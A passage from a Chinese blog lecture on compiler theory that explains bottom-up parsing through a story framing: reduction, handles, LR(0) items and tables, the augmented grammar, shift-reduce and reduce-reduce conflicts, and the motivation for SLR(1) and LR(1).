<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[语法分析(4)：以听众为中心的自底向上语法分析]]></title>    <link>https://juejin.cn/post/7605800124883615750</link>    <guid>https://juejin.cn/post/7605800124883615750</guid>    <pubDate>2026-02-13T01:27:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605800124883615750" data-draft-id="7605807405306986559" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="语法分析(4)：以听众为中心的自底向上语法分析"/> <meta itemprop="keywords" content="编译原理"/> <meta itemprop="datePublished" content="2026-02-13T01:27:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="搞笑僵尸思考时间"/> <meta itemprop="url" content="https://juejin.cn/user/168673917806618"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            语法分析(4)：以听众为中心的自底向上语法分析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/168673917806618/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    搞笑僵尸思考时间
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T01:27:32.000Z" title="Fri Feb 13 2026 01:27:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p>本文是本人撰写的编译原理讲义。</p>
<p>本系列讲义适用于：被强迫学习编译原理前端，或者希望弄明白如何做科研的人。</p>
<h3 data-id="heading-0">1. 归约：人类语法分析过程核心</h3>
<p>为编程语言设计出语法，终究是要给人用来编程。也就是说，语法一方面是用来组织语言的，另一方面也是要用来给机器和人来理解这个被组织出来的符号串的。</p>
<p>那么，既然前面单纯地以机器为中心的理解过程被证明暂时不太可行，那不如试一下分析人类是怎么理解一句话吧，然后模仿这个过程写一个分析算法？</p>
<p>还是随便先拿个简单例子，就“我是大学生”这句话吧。</p>
<p>首先人肯定是一个一个字去听，听的过程中如果发现了一个词，肯定会根据词性来进行归纳，然后再根据各种语法合并这些语法概念，直到最后发现这是一个句子。</p>
<p>下面的过程就是一个模拟理解这句话的过程，其中|模拟了读入的进度。</p>
<pre><code class="hljs language-xml" lang="xml">我|是大学生 →<span class="hljs-tag">&lt;<span class="hljs-name">主语</span>&gt;</span>是|大学生 →<span class="hljs-tag">&lt;<span class="hljs-name">主语</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">动词</span>&gt;</span>大学生| →<span class="hljs-tag">&lt;<span class="hljs-name">主语</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">动词</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">名词</span>&gt;</span>| → <span class="hljs-tag">&lt;<span class="hljs-name">主语</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">谓语</span>&gt;</span>| → <span class="hljs-tag">&lt;<span class="hljs-name">句子</span>&gt;</span>|
</code></pre>
<p>如果用语法树的构建来表示，那就是：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c67dcb58a534c8fbd5fb6eac1ae167a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pCe56yR5YO15bC45oCd6ICD5pe26Ze0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771550852&amp;x-signature=xu23e88Umt0SJzxifX6lTz6ZHHU%3D" alt="" loading="lazy"/>​<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/588d9631d66047409dfc0422540ba1b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pCe56yR5YO15bC45oCd6ICD5pe26Ze0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771550852&amp;x-signature=GouGFWZ1wOdEjDFOPrsGNivdo%2Fw%3D" alt="" loading="lazy"/></p>
<p>看起来，这样的理解方式似乎是为了给大脑减负：一方面我们有从左到右的阅读习惯，另一方面由于人类的短时记忆极其有限（通常只能维持 7 个左右的单位），所以总会想办法把已经读进去的符号尽可能抽象成一个语法符号，从而化简这段东西在脑海里的复杂度，方便理解。</p>
<p>那如果说组织语言是理解语言的逆过程，意味着组织语言就是类似于LL1一样的不断在非终结符中往下挖出来一棵树的过程，而顺序和我们的阅读顺序相反，是从右往左深度优先遍历。</p>
<p>之所以按照这种顺序，因为这样子左边相对右边要更迟推导出来，与理解过程中最先被处理相对应。</p>
<p>话说回来，理解这个词也太宽泛了，感觉离语法树这个语境太远了，换个什么词比较好呢。。</p>
<p>这些游兵散勇一样的单词，一簇一簇地归纳到了某个语法概念的旗下，有点像是约分、约简一样，把复杂的问题给简化。。。归纳。。约简。。归约？？？可还行。</p>
<p>在电脑敲下归约这个词的时候，输入法总是情不自禁把另一个同音词规约放到了首位。莫非这两词差不多？？好像不对，规更像是规范，由于是名词，所以后面的约也更像是约定的约，跟归约的意思差远了！</p>
<p>说罢，便将归约设为了固定首位。</p>
<h3 data-id="heading-1">2. 找出句柄：基于归约的语法分析重点</h3>
<p>总结下现在的情况：从左往右扫描待解析的命令，然后一旦发现可以归约的东西就进行归约。</p>
<p>Emm，怎么越想越像拼拼图的过程了：先把一个一个的拼图碎片按相似度拼出一个个模块，之后要是模块之间又有相似性，就再次拼装到一起。</p>
<p>那现在问题来了，拼图是有图像让我发现他们的相似性的；这符号串中，怎么去发现符号之间的关联性呢？</p>
<p>啊对，这些符号串是通过一定的规则，也就是产生式，从左部推导出右部伸展来的。</p>
<p>那我现在就应该反过来，在扫描过程中一旦从我手上已读入的内容中识别出了某条产生式的右部，那就进行归约呗！</p>
<p>产生式右部，这名字太长了，换个什么名字好呢。。它们就像是被识别句子的把柄一样，干脆就叫这些东西做句柄吧！</p>
<p>好好好，现在问题就变成了，怎么在扫描的过程中识别句柄呢。。？</p>
<p>等一下，识别识别，之前词法分析器识别的是单词，那能不能魔改一下DFA，让它从识别符号串构成的单词，变成识别由单词串组成的句子？？</p>
<p>“还真别说，原理上完全可行啊，DFA核心也就是只要走到终态就成功识别，现在只要把激励从单纯的终结符变成和非终结符的并集，好像就能搞定啊！”午饭时间，师傅简单听了一下方案汇报，立马就给予了肯定。</p>
<p>“就是我感觉有几个小问题，你想想咋个解决。</p>
<p>首先，你刚刚不是说这个句柄是组装着突然发现的么，那我就当你是不断地扫描新符号，规约交替进行。但在马上就要组装出来的句柄之前，感觉有很大可能会有一些和这个句柄毫无关系的符号存在于你的识别缓存区中。</p>
<p>按照DFA的逻辑，只能是从开始符号接受正确的激励，只有能到达终态才叫做识别成功。那现在有一些无关的符号在你要识别的句柄之前，你就需要想出来一个机制去排除这些额外符号的干扰。或者说，即使有这些不相干符号提前给状态机一些无关的激励，也能让他最后识别正确。</p>
<p>第二个问题，你之前不是说过要有层次结构就必须要有栈么，那现在栈到哪里去了？先这么多吧，我稍后还有个会，先撤了。”说罢便匆匆离去了。</p>
<p>对啊，栈去了哪里呢？等一下，识别缓冲区？对啊，这不就是那个栈么！符号一个一个压入缓冲区里面，然后要是满足规约条件，就把这些符号组装成，或者说归约成一个非终结符，组装出来的东西就还是出现在缓冲区指示器的顶端，这不就是栈的后进先出嘛！</p>
<p>这么说来，和单纯的DFA相比，现在就是多了一个栈来保存过往的路径以及当前的状态！</p>
<p>那只剩下师傅说的那个问题了：怎么确保在初态不确定的前提下还能在合适的激励下走到终态呢？</p>
<p>等一下，初态真的不确定吗？？</p>
<p>如果按照之前LL(1)里面First集合的思路，First(S)总能把句子头部可能出现的单词给求出来；而Follow(β)总能把这个符号后面可能有哪些符号给算出来，而且还很大可能不是符号表的全集。</p>
<p>这说明，符号之间的前后顺序肯定有关联的，也就是说，句柄前面的符号应该也是能计算出来的！</p>
<p>那如果，我能提前计算出，从句首一直到句柄开始前会有哪些先导的符号，然后把这个状态作为识别句柄的开始状态，接着拼接那个识别具体句柄的DFA，不就解决了这个问题了？？</p>
<p>所以接下来，就应该把所有状态都列出来，再找出他们的相互关系。</p>
<h3 data-id="heading-2">3. 进度条=产生式+指示器=状态</h3>
<p>既然知道大方向是要算出来特定句柄的前缀，那么就老方法，从简单例子那里总结吧。出来吧随机文法生成器！</p>
<p>习题1：文法G[E]</p>
<pre><code class="hljs language-css" lang="css">E→aAc 
<span class="hljs-selector-tag">A</span>→<span class="hljs-selector-tag">b</span>
</code></pre>
<p>毫无头绪的时候，人就喜欢乱点鼠标。</p>
<p>鼠标在a的左边点击一下，闪呀闪呀。按一下右键，按一下右键。。。</p>
<p>Emm，怎么感觉 ，这个扫描、组装的过程，完全就是光标扫描的过程：</p>
<p>就像是，一开始有一个光标从a的左边开始闪烁，然后接受一个a之后，光标移动一下；来到A之后，光标在第二行左边开始闪烁。这个时候上下两层平行世界都在等待各自想要的符号。然后b读入之后，A的这个式子的光标移到了最右边，这个b归约成A，第一条式子心心念念的A这不就拿到了，最后再加上c，结束。</p>
<p>如果把“E-&gt;|aAc”看作是一个时刻，接收完a之后的场合明显不一样了，那就可以看作是发生了状态转移，变成“E-&gt;a|Ac”！然后这个时候由于要进入A这个子程序，这个时候的状态似乎就应该包括这个子函数的产生式组装进度。</p>
<p>对啊，指示符在串中有不同位置，这完全就是个进度条！而进度条本身就可以代表状态，那么只要把句柄出来之前的状态全部列出来，就可以把DFA拼凑完整了。不过这个竖线光标也太容易和字母l或者或 | 混淆了。还是用个间隔号 “·”来做进度指示器吧！</p>
<p>所以，对于同一个产生式的两个不同进度条</p>
<p>a. X→X_1 X_2…X_(i-1) · X_i X_(i+1)…X_n</p>
<p>b. X→X_1 X_2…X_(i-1) X_i · X_(i+1)…X_n</p>
<p>可以把它们看作是不同的状态。</p>
<p>如果X_i是终结符, 意味着当处于状态a时，则只需读取X_i，就会让状态a跳转到状态b；此外，两个状态之间应连一条标记为X_i的弧</p>
<p>如果X_i是非终结符，意味着当处于a状态时，需要进入到X_i的子程序中。</p>
<p>假设存在如下以X_i为左部的产生式：</p>
<p>c. X_i→·ab</p>
<p>d. X_i→·ac</p>
<p>e. X_i→·bc</p>
<p>意味着X_i可能存在多个分支。而这些产生式实际上与b一样都处于同样的状态。</p>
<p>因此与a产生式处于同一个状态的进度条有a、c、d、e四条。</p>
<p>假设该状态为A，且系统正处于状态A。</p>
<p>则当输入符号a时，所有可以处理符号a的产生式进度都会更新，进入只包含以下两条进度条的状态B：</p>
<p>f. X_i→a·b</p>
<p>g. X_i→a·c</p>
<p>意味着所有不能处理a的产生式全部消失。</p>
<p>当某个进度条到达100%，也就是进度条指示器到达了最右边，意味着前面的零件已经足以组装成产生式左部的非终结符，之后就可以把缓冲区中所有符号用于归约，并得到新的非终结符X_i。</p>
<p>由于此时相当于从子程序中返回，应该回到调用子程序的位置，也就是状态A。</p>
<p>意味着：状态A获得了非终结符X_i，X_i进入符号栈；而只有a进度条可以处理X_i，因此更新后得到状态b。</p>
<p>啊！！爽！！！又多一个神奇算法了，叫什么好呢。。</p>
<p>首先它也是从左到右(Left to right)扫描，也给一个L开头吧；然后每次都是把当前输入串的最右（Rightmost）句柄进行归约；然后完全不用像LL(1)那样往前看哪怕1个符号。。那就叫它LR(0)分析法吧！</p>
<h3 data-id="heading-3">4. 盲目的LR(0)分析法</h3>
<h4 data-id="heading-4">4.1 拓广文法</h4>
<p>来来来，赶紧打铁趁热试试别的案例。</p>
<p>习题2：分析串a#在文法G[S]下的语法树</p>
<pre><code class="hljs language-css" lang="css">S→<span class="hljs-selector-tag">A</span>|<span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">A</span>→S
</code></pre>
<p>首先，这是个以S为开始符号的文法，那么就从S的产生式为始，写出来相关的进度条。而由于S→·A需要进入A这个子程序，所以还要加上一条A→·S。啊等一下，接下来又由于A调用S这个子程序。。还写吗？算了先不写吧，反正写了跟上面两条也是一样的。</p>
<p>然后，对状态0中的每个进度条挨个施加不同的激励，生成新的子状态，得到状态1、2、3。</p>
<pre><code class="hljs language-css" lang="css">状态<span class="hljs-number">0</span>： S→·<span class="hljs-selector-tag">A</span> S→·<span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">A</span>→·S 
状态<span class="hljs-number">1</span>： S→<span class="hljs-selector-tag">A</span>· 
状态<span class="hljs-number">2</span>： S→<span class="hljs-selector-tag">a</span>· 
状态<span class="hljs-number">3</span>： <span class="hljs-selector-tag">A</span>→S·
</code></pre>
<p>从状态A开始，读入一个符号a，跳转到状态C；既然C的进度条已经满了，那就直接归约成S了呗。。等一下，那我现在应该在。。状态0，获得了S。。接下来我是该跳到状态3，还是直接结束？？假如跳到状态3，就又会经历归约，状态0遇到A。。这不循环了吗？？啥时候是个头？</p>
<p>哎，既然a后面都跟着句子结束符#，那就应该直接结束才对。</p>
<p>估计这文法存在自环的还不是个例，得想个通用方法来处理。</p>
<p>要不这样吧，每次分析前，为所有文法加上一句：S'→·S#作为初始进度条。这样一旦归约出了S，状态就会跳转成S'→S·#。接下来如果看到输入串已经结束，那就表示算法结束。</p>
<p>这么修改之后，开始符号S’只出现一次，这样就避免循环啦。</p>
<p>修改之后的文法比原来拓展增广了一个产生式，干脆就叫他拓广文法吧！</p>
<h4 data-id="heading-5">4.2 LR(0)的完整运行架构构建</h4>
<p>从初始文法G[S]开始，先对其进行拓广，增加新产生式，文法变成G[S']。</p>
<p>然后通过对初始产生式S'→·S#开始处理：</p>
<ul>
<li>
<p>如果点在非终结符(假设为A)旁边，就把子程序A的初始进度条加入到这个状态中；</p>
</li>
<li>
<p>如果点在终结符旁边，那就是在等待发现符号a；</p>
</li>
</ul>
<p>在上述操作无法创造新产生式之后，就对这个状态中施加可以处理的符号作为激励，从而得到新的状态进度条；原状态中不能处理这些激励的，在新状态中消亡。</p>
<p>由于每个状态都包含了多个进度条，就叫他们做进度条集合；而通过这样不断施加激励，生成的都是它的兄弟姐妹，所有的状态构成的集合就叫他们进度条集合大家族吧！</p>
<p>有了状态之间的跳转关系，为了方便查表，肯定要弄一个类似状态转移表那样的东西出来啦。算了，为了做区分，还是把这个表叫做LR(0)分析表吧。</p>
<p>首先把状态写到第一列上，把对应的终结符、终结符和#写到第一行去。接下来，如果状态A遇到符号a实现了正常的状态跳转，就在对应的格子中直接填写对应的数字；如果那个状态对应的是归约操作，那就直接为整行都覆盖同一个标记，这个标记的首字母是归约的首字母r，其后跟着对应产生式的序号，这样就可以知道是用第几条式子归约。最后，对于S'-&gt;S·#这一条，在#下面对应的格子里填上acc(ept)，表示语法分析结束，句子被接受。</p>
<p>运行的时候最重要的两个东西，一个是当前状态从哪个状态来的历史记录，一个是我手上有什么符号。</p>
<p>那干脆，这些东西全都用栈来记录吧！Emm，好像有点问题。状态我可以用整形来存，符号是字符型变量，两边搞到同一个数据结构去太烦了，干脆拆成两个不同数据类型的栈好了。</p>
<p>等一下，系统一开始要处于初态0，这个时候没有输入符号，两边对不上了呀！算了，反正也是占位符，加一个#在状态0对应的符号栈那里。这样结束的时候符号栈上正好是#S，加上还没有输入的#，正好构成了#S#，完美对称。</p>
<p>好好好，可以跟老板汇报了！</p>
<h4 data-id="heading-6">4.3 命名权：归老板所有</h4>
<p>老板听完了汇报，点点头表示认可。</p>
<p>然而师傅敏锐注意到，老板每每听到进度条、进度条集合、进度条集合大家族的时候，都会不自绝地皱眉。于是他试探到，“老板，我感觉进度条这几个词的起名好像不够高大上，要不您用您跨学科思维给小年轻打个样？”</p>
<p>老板不好意思笑笑“倒也没啥太好的想法，我就觉着这进度条这名字太长了。我看它本身也就像文章里面那些item一样一直往后列，干脆就叫项吧？”</p>
<p>好好的进度条被改口叫个不知所谓的项，表情一个不小心没控制住。还好师傅眼疾手快，赶紧碰了碰提醒了下，才恢复了表情管理。</p>
<p>“然后是大家族这个词确实太，接地气了。我学复分析的时候记得里面有个叫规范族的概念。我看你这个所谓家族也是按照一定规范构建的，干脆就叫项目集规范族怎么样？”</p>
<p>这一点倒是没意见。哎，反正命名啥的你爱叫啥叫啥吧。</p>
<p>“这样，你交给测试部门测一下，看看这玩意儿的通用性如何。好好过个周末吧！”</p>
<h4 data-id="heading-7">4.4 项的分类与冲突</h4>
<p>周一，刚到办公室，发现测试部门的报告已经呈上来了。</p>
<p>LR(0)的测试报告</p>
<p>本报告使用提交的LR(0)文法对定义变量的已拓广文法进行了分析：</p>
<p>(习题3)</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-number">0</span><span class="hljs-selector-class">.S</span>′→S 
<span class="hljs-number">1</span><span class="hljs-selector-class">.S</span>→<span class="hljs-selector-tag">tD</span> 
<span class="hljs-number">2</span><span class="hljs-selector-class">.D</span>→D,<span class="hljs-selector-tag">i</span> 
<span class="hljs-number">3</span><span class="hljs-selector-class">.D</span>→<span class="hljs-selector-tag">i</span>
</code></pre>
<p>在构建项目集规范族的过程中，发现其中有一个状态，同时存在两个冲突的操作：</p>
<pre><code class="hljs language-css" lang="css">S→rD· D→D·,<span class="hljs-selector-tag">i</span>
</code></pre>
<p>可以看出，该状态既可以直接进行归约，也可以等待下一个逗号的移入。</p>
<p>如果直接归约，则永远无法解析形如int a,b的串；</p>
<p>如果忽略归约，直接等待移入，则其他状态都无法归约出S，导致算法无法结束。</p>
<p>鉴于LR(0)分析方法未能解析常见的变量定义语法，其在使用上存在较大限制。</p>
<p>测试结论：不通过。如需要详细测试数据可联系工作号**********。</p>
<p>看完报告，心凉了半截，脑子里只有一个想法：什么鬼，模版上的星星都不删干净就交出来了么，就这细致程度还好意思说LR(0)不好用么 。</p>
<p>唉算了，这次确实是我这边没测好就交导致的。知耻而后勇，看看能不能举一反三把其他类似问题一起找出来。。</p>
<p>现在的问题应该是我之前只考虑了状态中只会有一个进度条满了可以归约，但其实还有可能出现其他可能的操作，包括但不限于，等待下一个终结符，非终结符。。怎么感觉情况很杂的样子。。</p>
<p>算了，要不我先根据圆点的位置和后续符号对项分类看看：</p>
<p>1.移进项目: 形如A→α·aβ,a∈V_T的项。</p>
<p>2.待约项目: 形如A→α·Bβ,B∈V_N的项目,表明要等待后续串归约成B之后才能继续分析。</p>
<p>3.归约项目: 形如A→α·的项目。它表明一个产生式右部即句柄α已形成,可归约成A。</p>
<p>4.接受项目: 形如S’→α · #的项目,表明语法分析完成。</p>
<p>哦哦，一共才四类嘛，并没有想象中的那么复杂。</p>
<p>那再试着总结一次：</p>
<p>LR(0)只能处理项目集中单单只有一个归约的情况。</p>
<p>假如除了归约项目以外还有移进项目，那么就会导致移进-归约冲突；</p>
<p>假如项目集中有两个或以上归约项目，那么可以肯定的是，这些项目的左部肯定不一样，那对于要用那条式子进行归约就又成问题了。对于这类问题，称为归约-归约冲突吧。</p>
<p>假如除了归约项目外还有待约项目，那这个待约项目首先会被当作子程序处理，生成新的移进项目或者待约项目；对其中的待约项目又会重复循环，直到全部生成了新的移进项目或类似A-&gt; ·这样的空串产生式对应的归约项目，那就又对应回上面两类冲突。因此，不存在归约待约冲突。</p>
<p>假如项目集中除了归约项目外还有接受项目，这种情况嘛，当然是结束优先，不存在冲突！</p>
<p>等一下，会不会有移进-移进冲突？？</p>
<p>应该不会吧。。？移进移进冲突不就是说有多条移进项目么。这些项目在遇到处理不同的符号自己就会挂掉了，还冲突个啥啊。</p>
<p>再想深一层，这些冲突的核心到底是什么？</p>
<p>我倒是知道政治老师教过现实中冲突的核心无非就是资源的争夺╮(￣▽￣)╭。总不能这句话也能用在这里吧。。哎？还真别说，如果把归约对应的动作在于把符号栈的元素出栈，如果把这些符号拼装成终结符，就再也回不去了。无论后面再来些什么符号，也没法拼装出正确的非终结符，这就解释了两种冲突。同时，这个也可以解释为啥不存在移进移进冲突了：那些符号都在栈上，一切都可逆，所以就没有冲突啦！</p>
<p>总结起来就是一句话：归约导致了栈上面的符号回不去，所以一旦在这个状态中无法区分自己到底应该是要移入，还是选择哪些特定的符号进行归约，就会出现相应的冲突。</p>
<h3 data-id="heading-8">5. 粗粒度与细粒度：Simple LR(1) 与 LR(1)，</h3>
<h4 data-id="heading-9">5.1 LR(0)的升级思路</h4>
<p>既然现在知道了一切的犹豫都来自于信息不足，那么改进的方向当然是让它获得更多信息啦。至于什么信息，（看看表）吃完午饭再想。</p>
<p>悠哉悠哉来到园区门口，恰巧目睹了一起争执：只见一辆丰田凯美瑞停在出场区这里，估计是外来车没登记，要等待保安手动抬杆。没想到那保安的脸色黑得吓人，跟那车子吼了几声，说的“不要按喇叭，我们会给你开的。”司机似乎是一脸懵，回复说“我也妹按喇叭呀？”保安没好气说“昨天按喇叭的不是你吗？丰田银色凯美瑞，我都认到你了。”司机一脸无奈：“我今天第一天来啊，你说的他的车应该不会也是粤E的吧？”貌似这个时候保安才留意到车牌这回事，看了一眼，没搭话，车也就开走了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b42c820ba7049d2ad3dc1ba6530cb52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pCe56yR5YO15bC45oCd6ICD5pe26Ze0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771550852&amp;x-signature=1b6YClU0Tj6tG8sPnUS8NjeaqM0%3D" alt="" loading="lazy"/><img alt="" title="点击并拖拽以移动" src="" loading="lazy"/>​<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c967414f318e4cb18e2f5ac3a462e923~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pCe56yR5YO15bC45oCd6ICD5pe26Ze0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771550852&amp;x-signature=b6%2F7gZtBEAHwn74iwG8lUoxMB%2BU%3D" alt="" loading="lazy"/></p>
<p>吃饭的时候跟师傅聊起这茬，师傅感慨道：“说句政治不正确的话，有时候真不由得感慨，某些人的职位真的对得起他的智商。你说他记不住车牌也就算了，居然连粤E粤S都完全不分，还那么情绪化，难怪口碑一直都那么差。假如他能稍稍能聪明一点，在摆臭脸之前稍稍看一下这个车的来源，估计也没这么尴尬。”</p>
<p>说者无心听着有意：既然现在LR(0)需要更多的信息，往往就是不知道归约的时机对不对，就像是那个保安，眉毛胡子一把抓，看到银色丰田凯美瑞就摆臭脸，那肯定不行。既然现在要归约成特定非终结符,比如A，那如果发现后面的符号a确实好在Follow(A)之中，又不会有其他移进符号等待这个符号a，那就可以直接进行归约而无需纠结啦；相反，如果这个符号a被其他移进项目虎视眈眈，但又不在Follow(A)之中，那也可以马上确定就是要先处理移进项目。这样冲突就解决啦。</p>
<p>师傅听完，点评道：“我是看那保安可能记忆力有限才让他只记住前两位，假如他记忆力够何不直接记车牌？那多精准。</p>
<p>回到你的算法上，现在又没有成本限制，你何不让这算法一步到位？</p>
<p>假如有S=&gt;*αAβ_1，S=&gt;*αAβ_2，那你的Follow(A)实际上就对应于First(β_1)∪First(β_2)。如果你直接给A的每一条产生式求它之后出现的β_1的First集合，那就能区分得更细，遇上冲突的概率肯定要比你Follow(A)要低。”</p>
<p>（想了好一阵）要不，我还是两个都实现一下，弄两个不同精度的算法。这样复杂的文法用复杂的算法分析，简单的就用简单的应付，这样成本啥的也不至于太高。师傅你说的那种高精度算法，由于总要往前看一个符号，干脆就直接叫LR(1)；而求Follow的版本，算是LR(1)的简化版，干脆就叫SLR(1)。</p>
<p>师傅赞赏地点点头，“你这让我我想起鲁迅的一句话：人的智能，就体现在会根据不同成本创造和使用合适的工具！”</p>
<p>我也想起鲁迅说的另一句话，“我没说过”。哈哈哈哈哈哈</p>
<h4 data-id="heading-10">5.2 粗粒度的SLR(1)</h4>
<p>总结下来，SLR(1)的核心也就是这么一段话：</p>
